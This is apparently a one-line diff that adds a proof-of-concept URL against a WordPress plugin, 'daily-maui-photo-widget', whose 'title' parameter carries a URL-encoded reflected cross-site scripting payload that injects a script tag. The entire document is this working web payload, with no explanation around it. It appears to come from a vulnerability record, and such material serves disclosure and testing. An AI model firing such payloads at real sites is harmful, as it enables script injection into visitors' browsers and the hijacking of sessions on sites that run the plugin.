@@ -1,0 +1,1 @@
+http://www.example.com/wp-content/plugins/daily-maui-photo-widget/wp-dailymaui-widget-control.php?title=%22%3E%3Cscript%3Ealert%28%22XSS%22%29;%3C/script%3E
